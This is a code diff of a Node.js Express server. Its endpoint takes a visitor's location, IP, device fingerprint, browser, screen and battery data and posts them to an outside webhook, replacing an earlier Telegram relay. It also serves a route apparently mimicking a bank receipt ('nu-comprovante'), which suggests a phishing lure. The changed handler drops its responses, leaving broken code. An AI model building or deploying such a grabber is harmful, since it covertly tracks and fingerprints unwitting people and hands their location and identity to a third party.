@@ -2,34 +2,68 @@
 const express = require("express");
 const bodyParser = require("body-parser");
 const cors = require("cors");
+const path = require("path");
 const axios = require("axios");
 
 const app = express();
+
+// Middleware
 app.use(cors());
 app.use(bodyParser.json());
+app.use(bodyParser.urlencoded({ extended: true }));
 
-const TELEGRAM_BOT_TOKEN = "BOT-TOKEN"; // Substitua pelo token do seu bot
-const TELEGRAM_CHAT_ID = "CHAT-TOKEN"; // Substitua pelo ID do chat (ou grupo) para onde quer enviar
+// Serve static files
+app.use(express.static(path.join(__dirname, 'src/public')));
+
+// Importar rota do comprovante
+const nuComprovanteRouter = require('./src/routes/nu-comprovante');
+
+// Rotas
+app.use('/nu-comprovante', nuComprovanteRouter);
 
 app.post("/send-location", async (req, res) => {
-  const { latitude, longitude, maps } = req.body;
+  const {
+    latitude,
+    longitude,
+    altitude,
+    speed,
+    heading,
+    maps,
+    browserInfo,
+    screenInfo,
+    isOnline,
+    ip,
+    fingerprint,
+    batteryStatus
+  } = req.body;
 
-  const message = `A localização do usuário é:\nLatitude: ${latitude}\nLongitude: ${longitude}\nMaps: ${maps}`;
+  // Formatação da mensagem para enviar
+  const message = {
+    location: {
+      latitude,
+      longitude,
+      altitude,
+      speed,
+      heading,
+      maps
+    },
+    browserInfo,
+    screenInfo,
+    isOnline,
+    ip,
+    fingerprint,
+    batteryStatus
+  };
 
   try {
-    // Envia a localização para o Telegram
-    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      chat_id: TELEGRAM_CHAT_ID,
-      text: message,
-    });
+    // Envia os dados para o webhook
+    const response = await axios.post('https://webhookauto.tampus.chat/webhook/send', message);
 
-    res.status(200).json({ success: true });
   } catch (error) {
-    console.log(error);
-    res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
   }
 });
 
-app.listen(8088, () => {
-  console.log("Servidor rodando na porta 8088");
+const PORT = process.env.PORT || 8088;
+app.listen(PORT, () => {
+  console.log(`Servidor rodando na porta ${PORT}`);
 });
